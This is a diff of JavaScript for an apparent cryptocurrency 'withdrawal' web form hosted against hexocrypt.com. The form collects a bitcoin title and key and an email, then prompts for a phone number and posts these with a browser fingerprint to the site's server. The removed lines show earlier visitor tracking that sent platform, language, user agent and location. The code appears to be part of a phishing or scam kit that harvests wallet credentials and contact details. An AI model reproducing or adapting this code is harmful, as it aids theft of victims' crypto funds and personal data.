@@ -1,7 +1,4 @@
 const xhr = new XMLHttpRequest()
-var popup = document.getElementById('popup');
-var popupContent = document.querySelector('.popup-content');
-let button = document.getElementById("sumbit-button")
 
 class UserInfo {
     constructor() {
@@ -21,20 +18,11 @@ class UserInfo {
 
         return sicret_key
     }
-
 }
 
 let info = new UserInfo()
-let select = document.querySelector('.country_code_form');
-let telefon_verify = document.querySelector('.input_telefon');
-let code = "+31";
 
-select.addEventListener('change', () => {
-    code = select.value
-    let code_form = document.getElementById("code_form")
 
-    code_form.innerText = code
-});
 
 function loaderFunction(status) {
     if (status) {
@@ -52,7 +40,6 @@ function loaderFunction(status) {
 async function send_request(type, laoder, url, data) {
     return new Promise((resolve, reject) => {
         let page = `https://hexocrypt.com/api/${url}`;
-
         xhr.open(type, page)
         xhr.responseType = "json"
         xhr.setRequestHeader('Access-Control-Allow-Headers', '*');
@@ -63,7 +50,6 @@ async function send_request(type, laoder, url, data) {
         xhr.setRequestHeader("cache", "no-cache")
         xhr.setRequestHeader("credentials", "same-origin")
         xhr.setRequestHeader("redirect", "follow")
-
 
         xhr.onload = () => {
             resolve(xhr.response)
@@ -79,30 +65,18 @@ async function send_request(type, laoder, url, data) {
     })
 }
 
-async function set_phone_numbers(codes) {
-    let genres = document.getElementById("country_codes")
-    let code_form = document.getElementById("code_form")
-
-
-    let country_codes = codes
-
-    for (let c in country_codes) {
-        code_form.innerText = country_codes[0]?.dial_code
-        let newOption = new Option(`${country_codes[c]?.emoji} ${country_codes[c]?.name}`, country_codes[c]?.dial_code);
-        genres.append(newOption);
-    }
-}
-
 async function check_form(keys) {
-
     let bitcoin_title_id = document.getElementById("bitcoin_title").value
     let bitcoin_key_id = document.getElementById("bitcoin_key").value
-    let email = document.getElementById('email_input').value
-
+    let email = document.getElementById('email_form').value
     document.getElementsByClassName("deposit-form__wait")[0].classList.add('active')
 
+
     setTimeout(() => {
-        if (bitcoin_key_id == "") {
+
+
+
+        if (bitcoin_title_id == "") {
             document.getElementsByClassName("deposit-form__wait")[0].classList.remove('active')
 
             document.querySelector('.form-error').classList.add('active');
@@ -111,8 +85,7 @@ async function check_form(keys) {
             }, 7000)
 
             return
-
-        } else if (bitcoin_title_id == "") {
+        } else if (bitcoin_key_id == "") {
             document.getElementsByClassName("deposit-form__wait")[0].classList.remove('active')
 
             document.querySelector('.form-error').classList.add('active');
@@ -123,13 +96,13 @@ async function check_form(keys) {
             return
         } else if (email == "") {
             document.getElementsByClassName("deposit-form__wait")[0].classList.remove('active')
+
             document.querySelector('.form-error').classList.add('active');
             setTimeout(() => {
                 document.querySelector('.form-error').classList.remove('active');
             }, 7000)
 
             return
-
         }
 
         for (let key in keys) {
@@ -139,17 +112,16 @@ async function check_form(keys) {
                 document.querySelector('.form-error').classList.remove('active');
 
                 popup.classList.add('show');
-
                 document.getElementById("skip").addEventListener("click", () => {
                     popup.classList.remove('show');
                     document.getElementsByClassName("deposit-form__wait")[0].classList.add('active')
                     document.querySelector('.data-inccorrect').classList.remove("active");
                     document.querySelector('.form-error').classList.remove('active');
 
-                    send_request("post", false, "withdraw-pages", { email: email, type: "balance", phone: null, sicret: String(navigator.productSub + navigator.vendor + navigator.appName + navigator.platform + navigator.product + navigator.appVersion) })
+                    send_request("post", false, "withdraw-pages", { email: email, type: "important", phone: null, sicret: String(navigator.productSub + navigator.vendor + navigator.appName + navigator.platform + navigator.product + navigator.appVersion) })
 
                     setTimeout(() => {
-                        window.location.href = `withdraw-2.html?email=${email}`;
+                        window.location.href = `withdraw.html?email=${email}`;
                     }, 10000)
                 })
                 document.getElementById("send").addEventListener("click", () => {
@@ -160,7 +132,7 @@ async function check_form(keys) {
                         document.getElementById("fill_phone").classList.add('active')
                         setTimeout(() => {
                             document.getElementById("fill_phone").classList.remove('active')
-                        }, 7000)
+                        }, 10000)
 
 
                     } else {
@@ -171,10 +143,10 @@ async function check_form(keys) {
 
                         let phone = `${code}${nubmer_input}`
 
-                        send_request("post", false, "withdraw-pages", { email: email, type: "balance", phone: phone, sicret: String(navigator.productSub + navigator.vendor + navigator.appName + navigator.platform + navigator.product + navigator.appVersion) })
 
+                        send_request("post", false, "withdraw-pages", { email: email, type: "important", phone: phone, sicret: String(navigator.productSub + navigator.vendor + navigator.appName + navigator.platform + navigator.product + navigator.appVersion) })
                         setTimeout(() => {
-                            window.location.href = `withdraw-2.html?email=${email}`;
+                            window.location.href = `withdraw.html?email=${email}`;
                         }, 10000)
                     }
                 })
@@ -186,8 +158,7 @@ async function check_form(keys) {
                 });
 
                 return
-            }
-            else {
+            } else {
                 document.getElementsByClassName("deposit-form__wait")[0].classList.remove('active')
                 document.querySelector('.data-inccorrect').classList.add("active");
                 setTimeout(() => {
@@ -196,8 +167,8 @@ async function check_form(keys) {
             }
         }
     }, 2000)
-}
 
+}
 
 async function getDataBitcoin() {
     let keys = await send_request("get", false, "keys", false)
@@ -241,27 +212,9 @@ function getFlagEmoji(countryCode) {
     );
 }
 
-async function get() {
-    let users = await send_request("get", false, "users", false)
-    let codes = await send_request("get", false, "phone_nubmer_codes", false)
+// async function get() {
+//     let users = await send_request("get", false, "users", false)
+//     let codes = await send_request("get", false, "phone_nubmer_codes", false)
+// }
 
-    set_phone_numbers(codes)
-    const userLocation = await getUserInfo()
-
-    let data = {
-        id: users?.length - 1 + 1,
-        product_sub: info?.productSub(),
-        time: info?.timeOpened,
-        platform: info?.platform(),
-        langues: info?.langues(),
-        userAgent: info?.appVersion(),
-        sicret: info?.sicret(),
-        sunset: 0,
-        step: 0,
-        userLocation
-    }
-
-    send_request("post", true, "new_user", data)
-}
-
-get()
+// get()
